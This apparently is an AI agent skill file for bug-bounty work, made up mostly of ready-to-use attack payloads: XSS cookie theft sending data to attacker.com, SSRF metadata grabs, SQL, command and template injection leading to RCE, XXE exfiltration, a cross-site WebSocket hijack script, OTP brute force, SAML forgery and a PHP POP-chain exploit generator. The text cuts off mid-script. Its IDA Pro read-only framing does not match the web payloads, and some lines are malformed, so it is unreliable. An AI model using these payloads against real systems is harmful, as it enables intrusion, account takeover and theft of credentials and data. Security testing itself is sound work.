---
name: security-arsenal
description: "Security payloads, bypass tables, wordlists, gf pattern names, always-rejected bug list, and conditionally-valid-with-chain table. Use when you need specific payloads for XSS/SSRF/SQLi/XXE/NoSQLi/command injection/SSTI/IDOR/path-traversal/HTTP smuggling/WebSocket/MFA bypass, bypass techniques, or to check if a finding is submittable. Also use when asked about what NOT to submit. Use with IDA Pro via ida_mcp (triage-first, escalate per ladder)."
compatibility: "IDA Pro 8.3+ with the ida_mcp plugin (Hex-Rays for decompiler tools)"
metadata:
  workflow: "ida-pro-mcp-lazy"
  ceiling: "?profile=readonly"
---

> **IDA-MCP adapter (read first).** This skill runs against the binary open in IDA Pro through ida_mcp.
> Start at `?profile=triage` (`server_health` → `survey_binary`), escalate top-down; ceiling for this skill: **`?profile=readonly`** — read-only ceiling — start at `?profile=triage`.
> Never request unsafe/dbg "just in case" — justify each escalation in one sentence. All addresses accept hex/symbol/dec; `decompile_function` returns plain text, everything else JSON.

All tool calls below are native ida_mcp tools.

---

# SECURITY ARSENAL

Payloads, bypass tables, wordlists, and submission rules.

---

## XSS PAYLOADS

### Basic Probes
```javascript
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
javascript:alert(document.domain)
```

### Cookie Theft (proof of impact)
```javascript
<script>document.location='https://attacker.com/c?c='+document.cookie</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
<script>fetch('https://attacker.com?c='+btoa(document.cookie))</script>
```

### CSP Bypass Techniques
```javascript
// If unsafe-inline blocked — use fetch/XHR
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// If script-src nonce present — find nonce reflection
<script nonce="NONCE_FROM_PAGE">alert(1)</script>

// Angular template injection (bypasses many CSPs)
{{constructor.constructor('alert(1)')()}}

// React dangerouslySetInnerHTML reflection
// Vue v-html binding

// mXSS (mutation-based XSS)
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Polyglot (works in HTML/JS/CSS context)
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>
```

### DOM XSS Sources and Sinks
```javascript
// Sources (user-controlled input)
location.hash
location.search
location.href
document.referrer
window.name
document.URL

// Sinks (dangerous)
innerHTML = SOURCE
outerHTML = SOURCE
document.write(SOURCE)
eval(SOURCE)
setTimeout(SOURCE, ...)   // string form
setInterval(SOURCE, ...)
new Function(SOURCE)
element.src = SOURCE      // javascript: URI
element.href = SOURCE
location.href = SOURCE
```

---

## SSRF PAYLOADS

### Cloud Metadata
```bash
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://169.254.169.254/latest/user-data/
http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header: Metadata-Flavor: Google

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
```

### Internal Service Fingerprinting
```bash
http://localhost:6379      # Redis (unauthenticated, RESP protocol)
http://localhost:9200      # Elasticsearch (/_cat/indices)
http://localhost:27017     # MongoDB (binary — check for connection refused vs timeout)
http://localhost:8080      # Admin panel
http://localhost:2375      # Docker API — GET /containers/json
http://localhost:10.96.0.1:443  # Kubernetes API server
```

### SSRF IP Bypass Payloads
```bash
# All of these map to 127.0.0.1:
http://2130706433          # decimal
http://0177.0.0.1          # octal
http://0x7f.0x0.0x0.0x1   # hex
http://127.1               # short form
http://[::1]               # IPv6 loopback
http://[::ffff:127.0.0.1]  # IPv4-mapped IPv6
http://[::ffff:0x7f000001] # mixed hex IPv6

# DNS rebinding: A→external, then resolves to internal after allowlist check

# Redirect chain (Vercel pattern):
# If filter only checks initial URL but follows redirects:
http://allowed-domain.com/redirect?to=http://169.254.169.254/
```

---

## SQL INJECTION PAYLOADS

### Detection
```sql
'
''
`
')
'))
' OR '1'='1
' OR 1=1--
' OR 1=1#
' UNION SELECT NULL--
'; WAITFOR DELAY '0:0:5'--   -- MSSQL time-based
'; SELECT SLEEP(5)--          -- MySQL time-based
' OR SLEEP(5)--
```

### Union-Based (determine column count)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 'a',NULL,NULL--
```

### Blind SQLi (time-based confirmation)
```sql
# MySQL
' AND SLEEP(5)--
# PostgreSQL
' AND pg_sleep(5)--
# MSSQL
'; WAITFOR DELAY '0:0:5'--
# Oracle
' AND 1=dbms_pipe.receive_message('a',5)--
```

### WAF Bypass
```sql
/*!50000 SELECT*/ * FROM users     -- MySQL inline comment
SE/**/LECT * FROM users             -- comment injection
SeLeCt * FrOm uSeRs                -- case variation
%27 OR %271%27=%271                 -- URL encoding
ʼ OR ʼ1ʼ=ʼ1                       -- Unicode apostrophe
```

---

## XXE PAYLOADS

### Classic File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### Blind OOB via HTTP (DNS confirmation)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.burpcollaborator.net/xxe">]>
<foo>&xxe;</foo>
```

### Blind OOB via DNS + Data Exfil
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?%data;'>">
  %param1;
]>
<foo>&exfil;</foo>
```

### XXE via DOCX/SVG/PDF Upload
- SVG: `<image href="file:///etc/passwd" />`
- DOCX: malicious XML in `word/document.xml` with external entity

---

## PATH TRAVERSAL PAYLOADS

```bash
../../../etc/passwd
....//....//....//etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd   # double URL encoding
/etc/passwd%00.jpg                     # null byte truncation
....\/....\/etc/passwd                 # mix of separators
```

---

## IDOR / AUTH BYPASS PAYLOADS

### Horizontal Privilege Escalation
```bash
# Change numeric ID
GET /api/user/123/profile → GET /api/user/124/profile

# Change UUID (find victim UUID via other endpoints)
GET /api/profile/a1b2c3d4-... → GET /api/profile/e5f6g7h8-...

# HTTP method swap
PUT /api/user/123 (protected) → DELETE /api/user/123 (not protected)

# Old API version
GET /v2/users/123 (protected) → GET /v1/users/123 (not protected)

# Add parameter
GET /api/orders → GET /api/orders?user_id=456
```

### Vertical Privilege Escalation
```bash
# Parameter pollution
POST /api/user/update
{"role": "admin"}
{"isAdmin": true}
{"admin": 1}

# Hidden fields
<input type="hidden" name="admin" value="true">
# Change in Burp before sending

# GraphQL introspection → find admin mutations
{"query": "{ __schema { types { name fields { name } } } }"}
```

---

## AUTHENTICATION BYPASS PAYLOADS

### JWT Attacks
```bash
# None algorithm
# Decode JWT, change alg to "none", remove signature
import base64, json
header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Secret bruteforce
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

### OAuth Attacks
```bash
# Missing PKCE test
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# No code_challenge → check if 302 (not error) = PKCE not enforced

# State parameter check
GET /oauth2/auth?response_type=code&client_id=X&redirect_uri=Y&scope=Z
# Missing/static state parameter = CSRF on OAuth = account linkage attack
```

---

## NOSQL INJECTION PAYLOADS (MongoDB)

### Operator Injection (JSON body)
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": "admin", "password": {"$gt": ""}}
{"$where": "this.username == 'admin'"}
{"username": {"$in": ["admin", "root", "administrator"]}}
```

### GET Parameter Injection
```bash
# URL parameter injection
/login?username[$ne]=null&password[$ne]=null
/login?username[$regex]=.*&password[$regex]=.*
/login?username=admin&password[$gt]=

# MongoDB operator reference:
# $ne = not equal (bypass: value != null = any value matches)
# $gt = greater than (bypass: "" < any string)
# $regex = regex match (bypass: .* = anything)
# $where = JS expression (RCE potential on older MongoDB)
```

### Auth Bypass One-Liners
```bash
curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'

# URL-encoded for GET forms:
# username%5B%24ne%5D=null&password%5B%24ne%5D=null
```

---

## COMMAND INJECTION PAYLOADS

### Basic Detection
```bash
; id
| id
` id `
$(id)
&& id
|| id
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
```

### Blind OOB (out-of-band confirmation)
```bash
; curl https://attacker.burpcollaborator.net
; nslookup attacker.burpcollaborator.net
$(nslookup attacker.burpcollaborator.net)
`ping -c 1 attacker.burpcollaborator.net`
; wget https://attacker.com/$(id|base64)
```

### Bypass Techniques
```bash
# Bypass space filter
;{cat,/etc/passwd}
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;IFS=,;cat,/etc/passwd

# Bypass keyword filter (cat, id blocked)
# Obfuscate with quotes
;c'a't /etc/passwd
;c"a"t /etc/passwd
;$(printf '\x63\x61\x74') /etc/passwd

# Bypass via env
;$BASH -c 'id'
;${IFS}id

# Windows-specific
& dir
| type C:\Windows\win.ini
& ping -n 1 attacker.com
```

### Context-Specific (filename injection)
```bash
# File upload filenames
test.jpg; id
test$(id).jpg
test`id`.jpg
../test.jpg
../../../../../../etc/passwd
```

---

## SSTI DETECTION PAYLOADS (All Engines)

### Universal Probe (send all, observe which evaluate)
```
{{7*7}}        → 49 = Jinja2 (Python) or Twig (PHP)
${7*7}         → 49 = Freemarker (Java) or Spring EL
<%= 7*7 %>     → 49 = ERB (Ruby) or EJS (Node.js)
#{7*7}         → 49 = Mako (Python) or Pebble (Java)
*{7*7}         → 49 = Spring Thymeleaf
{{7*'7'}}      → 7777777 = Jinja2 (not Twig — Twig gives 49)
${"freemarker.template.utility.Execute"?new()("id")}  → Freemarker RCE
```

### RCE Payloads by Engine

**Jinja2 (Python/Flask/Django):**
```python
{{config.__class__.__init__.__globals__["os"].popen("id").read()}}
{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}
{{"".__class__.__mro__[1].__subclasses__()[396]("id", shell=True, stdout=-1).communicate()[0].strip()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**Freemarker (Java):**
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
```

**ERB (Ruby on Rails):**
```ruby
<%= `id` %>
<%= system("id") %>
<%= IO.popen('id').read %>
```

**Spring Thymeleaf:**
```java
${T(java.lang.Runtime).getRuntime().exec('id')}
__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
```

**EJS (Node.js):**
```javascript
<%= process.mainModule.require('child_process').execSync('id') %>
```

### Where to Test
```
Name/bio/username fields, email subject templates, invoice/PDF generators,
URL path parameters reflected in page, error messages, search query reflections,
HTTP headers that appear in rendered responses, notification templates
```

---

## HTTP SMUGGLING PAYLOADS

### CL.TE — Content-Length front-end, Transfer-Encoding back-end
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL — Transfer-Encoding front-end, Content-Length back-end
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0


```

### TE.TE — Both support Transfer-Encoding, obfuscate to disable one
```http
# Obfuscate the TE header so one layer ignores it
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

### H2.CL — HTTP/2 front-end with Content-Length injection
```
# In Burp Repeater, switch to HTTP/2
# Add Content-Length header manually (not auto-set by HTTP/2)
# Front-end ignores CL (HTTP/2 uses :content-length pseudo-header)
# Back-end uses CL → desync
```

### Detection (Burp)
```
1. Install HTTP Request Smuggler extension
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. All four probe types automatically sent
4. ~10-second timeout on CL.TE probe = back-end waiting = CONFIRMED
```

### Impact Chain
```
Basic desync          → Capture victim's next request → Read their auth token
+ Admin user traffic  → Access admin as victim
+ Cache poisoning     → Stored XSS at scale for all users
```

---

## WEBSOCKET PAYLOADS

### IDOR / Auth Bypass
```javascript
// Test: subscribe to other user's channel
{"action": "subscribe", "channel": "user_VICTIM_ID_HERE"}
{"action": "get_history", "userId": "VICTIM_UUID"}
{"action": "getProfile", "id": 2}
{"action": "admin.listUsers"}
{"action": "admin.getToken", "userId": "1"}
```

### Cross-Site WebSocket Hijacking (CSWSH)
```html
<!-- Host on attacker site. If no Origin validation, steals victim's WS data. -->
<script>
var ws = new WebSocket('wss://target.com/ws');
// Browser automatically sends victim's cookies
ws.onopen = () => ws.send(JSON.stringify({action:"getProfile"}));
ws.onmessage = (e) => fetch('https://attacker.com/?d='+encodeURIComponent(e.data));
</script>
```

### Test Origin Validation
```bash
# Should reject non-target origins. If it doesn't = CSWSH vulnerability
wscat -c "wss://target.com/ws" -H "Origin: https://evil.com"
wscat -c "wss://target.com/ws" -H "Origin: null"
wscat -c "wss://target.com/ws" -H "Origin: https://target.com.evil.com"
```

### Injection via WS Messages
```javascript
// XSS in chat/notification system
{"message": "<img src=x onerror=fetch('https://attacker.com?c='+document.cookie)>"}

// SQLi
{"action": "search", "query": "' OR 1=1--"}

// SSRF (if server fetches URLs from messages)
{"action": "preview", "url": "http://169.254.169.254/latest/meta-data/"}
```

---

## MFA / 2FA BYPASS PAYLOADS

### Pattern 1: OTP Brute Force (no rate limit)
```bash
# Try all 6-digit OTPs
ffuf -u "https://target.com/api/verify-otp" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 \
  -t 5

# Rate limit bypass: rotate session tokens between requests
# Or use GraphQL batching to send 100 attempts per request
```

### Pattern 2: OTP Reuse (token not invalidated)
```
1. Request OTP → receive "123456"
2. Submit OTP correctly → authenticated
3. Log out
4. Log in again
5. Submit same OTP "123456" (expired? still works?)
6. Try OTP from previous session at new login
```

### Pattern 3: Response Manipulation
```
Step 1: Enter wrong OTP → intercept response in Burp
Step 2: Change: {"success": false, "message": "Invalid OTP"} → {"success": true}
Step 3: Forward modified response → sometimes app trusts it and proceeds
Also try: change status code 401 → 200, or change redirect from /failed to /dashboard
```

### Pattern 4: Code Predictability
```python
import requests, time

# Some implementations use timestamp-based OTPs:
for t_offset in range(-30, 31):  # Test ±30 seconds
    totp_value = generate_totp(secret, time.time() + t_offset)
    r = requests.post("https://target.com/api/mfa", json={"otp": totp_value})
    if r.status_code == 200:
        print(f"VALID at offset {t_offset}s: {totp_value}")
        break
```

### Pattern 5: Backup Codes Not Rate Limited
```bash
# Backup codes are typically 8-character alphanumeric = smaller space than 6-digit TOTP
# Try brute force on /api/verify-backup-code if no rate limit
```

### Pattern 6: Skip MFA Step (Workflow Bypass)
```bash
# After entering username/password, you get a session cookie
# Test: skip the /mfa/verify step entirely, go directly to /dashboard
# If cookie grants access before MFA = auth flow bypass

# Also: complete MFA in one session, reuse cookie in another browser
# Checks whether MFA completion is tied to the specific session
```

### Pattern 7: Race on MFA Verification
```python
import asyncio, aiohttp


# Race 2 MFA verifications simultaneously
# If both succeed = parallel session ATO
async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify", json={"otp": otp}) as r:
        return await r.json()


async def race():
    async with aiohttp.ClientSession(cookies={"session": "YOUR_SESSION"}) as s:
        results = await asyncio.gather(verify(s, "123456"), verify(s, "123456"))
        print(results)


asyncio.run(race())
```

---

## SAML ATTACKS

### Attack 1: XML Signature Wrapping (XSW)
```xml
<!-- Original valid assertion: -->
<saml:Assertion ID="legit">
  <NameID>user@company.com</NameID>
  <ds:Signature>VALID_SIGNATURE_OVER_legit</ds:Signature>
</saml:Assertion>

<!-- XSW: Inject malicious assertion before/after the signed one. -->
<!-- Server validates signature on #legit but processes #evil instead. -->
<saml:Response>
  <saml:Assertion ID="evil">
    <NameID>admin@company.com</NameID>     <!-- Attacker-controlled -->
  </saml:Assertion>
  <saml:Assertion ID="legit">              <!-- Original stays valid -->
    <NameID>user@company.com</NameID>
    <ds:Signature>VALID_SIGNATURE</ds:Signature>
  </saml:Assertion>
</saml:Response>
```

### Attack 2: Comment Injection in NameID
```xml
<!-- Original: user@company.com -->
<!-- Injected:  -->
<NameID>admin<!---->@company.com</NameID>
<!-- XML parsers strip comments: admin@company.com -->
<!-- SAML validator sees "user@company.com" (before comment) -->
<!-- Application uses "admin@company.com" (after comment stripped) -->
```

### Attack 3: Signature Stripping
```
1. Capture SAMLResponse (base64 decode from browser)
2. Remove or modify the <Signature> element entirely
3. Change NameID to admin@company.com
4. Re-encode and submit
5. If server doesn't validate signature presence = admin login
```

### Attack 4: XXE in SAML Assertion
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<saml:Response>
  <saml:Assertion>
    <NameID>&xxe;</NameID>
  </saml:Assertion>
</saml:Response>
```

### Tools
```bash
# SAMLRaider (Burp extension) — most automated XSW testing
# Install from BApp Store, intercept SAMLResponse, right-click → SAML Raider

# Manual: decode, modify, re-encode
echo "BASE64_SAML_RESPONSE" | base64 -d | xmllint --format - > saml.xml
# Edit saml.xml
cat saml.xml | base64 -w0  # Re-encode
```

---

## GF PATTERN NAMES (tomnomnom/gf)

```bash
# Install: https://github.com/tomnomnom/gf
# Usage: cat urls.txt | gf PATTERN

gf xss          # XSS parameters
gf ssrf         # SSRF parameters
gf idor         # IDOR parameters
gf sqli         # SQL injection parameters
gf redirect     # Open redirect parameters
gf lfi          # Local file inclusion
gf rce          # Remote code execution parameters
gf ssti         # Template injection parameters
gf debug_logic  # Debug/logic parameters
gf secrets      # Secret/token patterns
gf upload-fields # File upload parameters
gf cors         # CORS-related parameters
```

---

## ALWAYS REJECTED — NEVER SUBMIT

Submitting these destroys your validity ratio. N/A hurts. Don't.

```
Missing CSP / HSTS / X-Frame-Options / other security headers
Missing SPF / DKIM / DMARC
GraphQL introspection alone (no auth bypass, no IDOR)
Banner / version disclosure without a working CVE exploit
Clickjacking on non-sensitive pages (no sensitive action in PoC)
Tabnabbing
CSV injection (no actual code execution shown)
CORS wildcard (*) without credential exfil PoC
Logout CSRF
Self-XSS (only exploits own account)
Open redirect alone (no ATO chain, no OAuth code theft)
OAuth client_secret in mobile app (disclosed, expected)
SSRF with DNS callback only (no internal service access)
Host header injection alone (no password reset poisoning PoC)
Rate limit on non-critical forms (login page Cloudflare, search, contact)
Session not invalidated on logout
Concurrent sessions allowed
Internal IP address in error message
Mixed content (HTTP resources on HTTPS page)
SSL weak cipher suites
Missing HttpOnly / Secure cookie flags alone
Broken external links
Pre-account takeover (usually — requires very specific conditions)
Autocomplete on password fields
```

---

## CONDITIONALLY VALID — REQUIRES CHAIN

These are valid ONLY when combined with a chain that proves real impact:

| Standalone Finding | Chain Required | Result if Chained |
|---|---|---|
| Open redirect | + OAuth code theft via redirect_uri abuse | ATO (Critical) |
| Clickjacking | + sensitive action + working PoC (not just login) | Medium |
| CORS wildcard | + credentialed request exfils user data | High |
| CSRF | + sensitive action (transfer funds, change email) | High |
| Rate limit bypass | + OTP/token brute force succeeding | Medium/High |
| SSRF DNS-only | + internal service access + data retrieval | Medium |
| Host header injection | + password reset email uses it | High |
| Prompt injection | + reads other user's data (IDOR) OR exfil OR RCE | High |
| S3 bucket listing | + JS bundles with API keys/OAuth secrets | Medium/High |
| Self-XSS | + CSRF to trigger it on victim | Medium |
| Subdomain takeover | + OAuth redirect_uri registered at that subdomain | Critical |
| GraphQL introspection | + auth bypass mutation or IDOR on node() | High |

**Rule:** Build the chain first, confirm it works end-to-end, THEN report. Never report A and say "could chain with B" — prove it.

---

## WORDLISTS (Installed in ~/wordlists/)

```
common.txt         # Common directories and files
params.txt         # Parameter names (id, user_id, file, etc.)
api-endpoints.txt  # API endpoint paths (/api/v1/users, etc.)
dirs.txt           # Directory names
sensitive.txt      # Sensitive paths (.env, config.json, backup, etc.)
```

### Built-in Paths Worth Fuzzing

```bash
# Sensitive files
/.env
/.git/config
/config.json
/credentials.json
/backup.sql
/dump.sql
/.DS_Store
/robots.txt
/sitemap.xml
/.well-known/security.txt

# Admin panels
/admin
/admin/login
/administrator
/wp-admin
/manager
/console
/dashboard
/panel

# API discovery
/api
/api/v1
/api/v2
/graphql
/graphiql
/swagger
/swagger-ui.html
/api-docs
/openapi.json
/v1
/v2
```

---

# POP CHAIN PAYLOADS — Property-Oriented Programming

> **Critical PHP exploit payloads**: Serialized objects that chain magic methods into dangerous sinks (RCE, file operations, SQL injection).

## PHP Serialization Format Reference

```
O:LENGTH:"CLASS_NAME":NUM_PROPERTIES:{PROPERTY_NAME;VALUE;}
s:LENGTH:"VALUE";    // String
i:VALUE;             // Integer
b:1;                 // Boolean (true)
b:0;                 // Boolean (false)
N;                   // NULL
a:NUM_ITEMS:{KEY;VALUE;}  // Array
```

## Private/Protected Property Encoding

```php
// Private property: \0ClassName\0propertyName
s:25:"\0VulnerableClass\0dangerous_method";s:10:"system('id')";

// Protected property: \0*\0propertyName
s:12:"\0*\0config";a:1:{s:3:"cmd";s:2:"id";}
```

## Framework-Specific POP Chains

### WordPress POP Chain

```php
// WordPress 6.4.x Session Token Hijack
O:28:"WP_User_Meta_Session_Tokens":2:{
    s:44:"\0WP_User_Meta_Session_Tokens\0session";a:1:{
        i:0;s:32:"ATTACKER_CONTROLLED_TOKEN";
    }
    s:44:"\0WP_User_Meta_Session_Tokens\0user_id";i:1;
}
```

### Laravel POP Chain

```python
# Laravel 10.x PendingDispatch RCE
def laravel_pop_rce(command):
    return f'''O:36:"Illuminate\\Broadcasting\\PendingDispatch":1:{{
    s:6:"\0*\0job";O:38:"App\\Console\\Commands\\EvalCommand":1:{{
        s:14:"\0*\0command";s:{len(command)}:"{command}";
    }}
}}}}'''


# Usage: laravel_pop_rce("cat /etc/passwd")
```

### Drupal POP Chain

```php
// Drupal 10.x Twig Template RCE
O:34:"Drupal\\Core\\Template\\TwigEnvironment":1:{
    s:15:"\0*\0loader";O:35:"Drupal\\Core\\Template\\TwigLoader":1:{
        s:12:"\0*\0templates";a:1:{
            s:10:"malicious";s:30:"{{_self.envDisplay('PATH')}}";
        }
    }
}
```

### Symfony POP Chain

```php
// Symfony 5.x Cache Adapter RCE
O:40:"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter":1:{
    s:11:"\0*\0deferred";a:1:{
        s:32:"cache_key";O:39:"Symfony\\Component\\Cache\\CacheItem":1:{
            s:13:"\0*\0innerItem";O:40:"Symfony\\Component\\Cache\\CacheItem":1:{
                s:14:"\0*\0poolHash";s:10:"system('id')";
            }
        }
    }
}
```

## Generic POP Chain Fuzzing Payloads

```
# Basic object injection tests (save as pop-fuzz.txt)
O:1:"A":0:{}
O:1:"B":1:{s:1:"a";s:1:"b";}
O:1:"C":2:{s:1:"a";s:1:"b";s:1:"c";s:1:"d";}
O:2:"AB":1:{s:1:"a";s:1:"b";}
O:3:"ABC":1:{s:1:"a";s:1:"b";}
O:1:"D":1:{s:1:"a";N;}
O:1:"E":1:{s:1:"a";b:1;}
O:1:"F":1:{s:1:"a";b:0;}
O:1:"G":1:{s:1:"a";i:0;}
O:1:"H":1:{s:1:"a";i:-1;}
O:1:"I":1:{s:1:"a";s:0:"";}
O:1:"J":1:{s:1:"a";a:1:{i:0;s:1:"x";}}
```

## Automated POP Chain Generator

```python
#!/usr/bin/env python3
"""
POP Chain Payload Generator for Bug Bounty
Generates PHP serialized objects with automatic exploit creation
"""

import base64
import urllib.parse


class POPChainGenerator:
    def __init__(self):
        self.chains = []

    def serialize_object(self, class_name, properties, private=False):
        """Generate PHP serialized object"""
        payload = f'O:{len(class_name)}:"{class_name}":{len(properties)}:'
        payload += "{"
        for prop_name, prop_value in properties.items():
            if private or prop_name.startswith("_"):
                # Private/protected property encoding
                if prop_name.startswith("_"):
                    prop_name = prop_name[1:]
                encoded_name = f"\0{class_name}\0{prop_name}"
                payload += f's:{len(encoded_name)}:"{encoded_name}";'
            else:
                payload += f's:{len(prop_name)}:"{prop_name}";'

            if isinstance(prop_value, str):
                payload += f's:{len(prop_value)}:"{prop_value}";'
            elif isinstance(prop_value, int):
                payload += f"i:{prop_value};"
            elif isinstance(prop_value, list):
                payload += self._serialize_array(prop_value)
            elif isinstance(prop_value, dict):
                payload += self._serialize_array(prop_value)
        payload += "}"
        return payload

    def _serialize_array(self, arr):
        """Serialize PHP array"""
        if isinstance(arr, list):
            arr = {i: v for i, v in enumerate(arr)}
        items = []
        for key, value in arr.items():
            if isinstance(key, int):
                items.append(f"i:{key};")
            else:
                items.append(f's:{len(key)}:"{key}";')

            if isinstance(value, str):
                items.append(f's:{len(value)}:"{value}";')
            elif isinstance(value, int):
                items.append(f"i:{value};")
        return f"a:{len(arr)}:{{" + "".join(items) + "}}"

    def encode_for_transmission(self, payload, encoding="base64"):
        """Encode payload for HTTP transmission"""
        if encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "hex":
            return payload.encode().hex()
        return payload


# WordPress Session Hijack Example
gen = POPChainGenerator()
wp_payload = gen.serialize_object(
    "WP_User_Meta_Session_Tokens", {"_session": ["HACKED_TOKEN_1234567890ABCDEF"], "_user_id": 1}, private=True
)

print("WordPress POP Chain:")
print(wp_payload)
print("\nBase64 encoded:")
print(gen.encode_for_transmission(wp_payload, "base64"))
```

## POP Chain Exploit Auto-Generator

```python
#!/usr/bin/env python3
"""
When a POP chain vulnerability is discovered, automatically generate
exploit code in multiple languages and save to poc/ directory.
"""

import os
from pathlib import Path


class POPExploitGenerator:
    """Generate complete exploit for discovered POP chain"""

    def __init__(self, target_url, vuln_info, chain_config):
        self.target = target_url
        self.vuln_info = vuln_info
        self.chain = chain_config
        self.poc_dir = Path("poc")

    def generate_python_exploit(self, output_name=None):
        """Generate Python exploit script"""
        if output_name is None:
            output_name = f"{self.vuln_info.get('name', 'pop_chain')}_rce.py"

        exploit = f'''#!/usr/bin/env python3
"""
POP Chain Exploit for {self.target}
Vulnerability: {self.vuln_info.get("description", "Unserialize RCE")}

Author: Bug Bounty Researcher
Date: {self.vuln_info.get("date", "2025-01-01")}
CVSS: {self.vuln_info.get("cvss", "9.8 (Critical)")}
"""

import requests
import base64
import sys
from urllib.parse import quote

TARGET = "{self.target}"
ENTRY_POINT = "{self.chain.get("entry_point", "/api/unserialize")}"

# POP Chain payload template
PAYLOAD_TEMPLATE = """{self.chain.get("payload", 'O:1:"A":0:{}')}"""

def generate_payload(command="id"):
    """Generate POP chain payload with command"""
    payload = PAYLOAD_TEMPLATE.replace("{{{{COMMAND}}}}", command)
    return base64.b64encode(payload.encode()).decode()

def exploit(command="id", verbose=True):
    """Execute command on target"""
    payload = generate_payload(command)

    headers = {{
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "POP-Chain-Exploit/1.0"
    }}

    data = {{"data": payload}}

    try:
        response = requests.post(
            f"{{TARGET}}{{ENTRY_POINT}}",
            headers=headers,
            data=data,
            timeout=10
        )

        if verbose:
            print(f"[+] Status: {{response.status_code}}")
            print(f"[+] Response length: {{len(response.text)}}")
            print(f"[+] Response body:")
            print(response.text)

        return response
    except requests.RequestException as e:
        print(f"[-] Error: {{e}}")
        return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 {output_name} <command>")
        print("Example: python3 {output_name} 'cat /etc/passwd'")
        sys.exit(1)

    command = sys.argv[1]
    print(f"[*] Target: {{TARGET}}")
    print(f"[*] Command: {{command}}")
    print("[*] Exploiting...")
    exploit(command)

if __name__ == "__main__":
    main()
'''

        # Save to poc/ directory
        output_path = self.poc_dir / output_name
        output_path.parent.mkdir(parents=True, exist_ok=True)
        output_path.write_text(exploit)
        print(f"[+] Python exploit saved: {output_path}")
        return exploit

    def generate_bash_exploit(self, output_name=None):
        """Generate Bash exploit script"""
        if output_name is None:
            output_name = f"{self.vuln_info.get('name', 'pop_chain')}_rce.sh"

        exploit = f'''#!/bin/bash
# POP Chain Exploit for {self.target}
# Vulnerability: {self.vuln_info.get("description", "Unserialize RCE")}

TARGET="{self.target}"
ENTRY_POINT="{self.chain.get("entry_point", "/api/unserialize")}"
PAYLOAD='{self.chain.get("payload", "O:1:A:0:{}")}'

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
NC='\\033[0m'

exploit() {{
    local cmd="${{1:-id}}"
    local payload=$(echo "$PAYLOAD" | sed "s/{{{{COMMAND}}}}/$cmd/g" | base64 -w0)

    echo -e "${{GREEN}}[*] Target: $TARGET${{NC}}"
    echo -e "${{GREEN}}[*] Command: $cmd${{NC}}"
    echo -e "${{YELLOW}}[*] Sending exploit...${{NC}}"

    response=$(curl -s -X POST \\
        "$TARGET$ENTRY_POINT" \\
